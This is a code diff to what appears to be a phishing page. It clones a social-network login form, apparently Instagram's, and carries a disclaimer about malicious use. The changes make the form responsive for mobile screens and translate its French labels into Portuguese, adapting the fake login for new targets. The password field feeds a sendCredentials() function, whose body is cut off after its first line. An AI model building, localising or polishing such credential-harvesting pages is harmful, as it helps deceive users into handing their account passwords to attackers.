@@ -32,7 +32,9 @@ The author of this page disclaims any responsibility for the malicious or illega
         padding: 20px;
         border: 1px solid #dbdbdb;
         text-align: center;
-        width: 350px;
+        width: 90%;
+        max-width: 360px;
+        box-sizing: border-box;
       }
 
       .login-logo {
@@ -44,8 +46,10 @@ The author of this page disclaims any responsibility for the malicious or illega
         border: 1px solid #dbdbdb;
         border-radius: 3px;
         padding: 9px;
-        margin: 0 40px 6px;
-        width: calc(100% - 80px);
+        margin: 0 auto 6px;
+        width: calc(100% - 20px);
+        max-width: 300px;
+        box-sizing: border-box;
       }
 
       .btn {
@@ -55,10 +59,12 @@ The author of this page disclaims any responsibility for the malicious or illega
         cursor: pointer;
         font-weight: 600;
         text-transform: uppercase;
-        padding: 5px;
-        margin: 8px 40px;
-        width: calc(100% - 80px);
+        padding: 10px;
+        margin: 8px auto;
+        width: calc(100% - 20px);
+        max-width: 300px;
         border-radius: 4px;
+        box-sizing: border-box;
       }
 
       .login-footer {
@@ -75,8 +81,9 @@ The author of this page disclaims any responsibility for the malicious or illega
 
       .divider {
         color: #dbdbdb;
-        margin: 10px 40px;
+        margin: 10px 0;
         position: relative;
+        text-align: center;
       }
 
       .divider:before,
@@ -114,7 +121,7 @@ The author of this page disclaims any responsibility for the malicious or illega
       .signup-footer {
         color: #262626;
         font-size: 14px;
-        margin: 20px;
+        margin: 20px 0;
       }
 
       .signup-link {
@@ -131,6 +138,27 @@ The author of this page disclaims any responsibility for the malicious or illega
         height: 40px;
         margin: 5px;
       }
+
+      @media (max-width: 600px) {
+        .login-form {
+          width: 100%;
+          padding: 15px;
+          border: none;
+          box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+
+        .form-control,
+        .btn {
+          width: calc(100% - 30px);
+          max-width: none;
+          margin: 0 auto 6px;
+        }
+
+        .divider:before,
+        .divider:after {
+          width: 35%;
+        }
+      }
     </style>
   </head>
   <body>
@@ -145,24 +173,25 @@ The author of this page disclaims any responsibility for the malicious or illega
         type="text"
         id="email"
         class="form-control"
-        placeholder="Numéro de téléphone, nom d'utilisateur ou e-mail"
+        placeholder="Número de telefone, nome de usuário ou e-mail"
       />
       <input
         type="password"
         id="password"
         class="form-control"
-        placeholder="Mot de passe"
+        placeholder="Senha"
       />
-      <button onclick="sendCredentials()" class="btn">Se connecter</button>
+      <button onclick="sendCredentials()" class="btn">Entrar</button>
       <div class="login-footer">
-        <a href="#" class="login-link">Mot de passe oublié ?</a>
+        <a href="#" class="login-link">Esqueceu a senha?</a>
       </div>
       <div class="signup-footer">
-        Vous n'avez pas de compte ?
-        <a href="#" class="signup-link">Inscrivez-vous</a>.
+        Não tem uma conta?
+        <a href="#" class="signup-link">Cadastre-se</a>.
       </div>
     </div>
   </body>
+
   <script>
     function sendCredentials() {
       var email = document.getElementById("email").value;
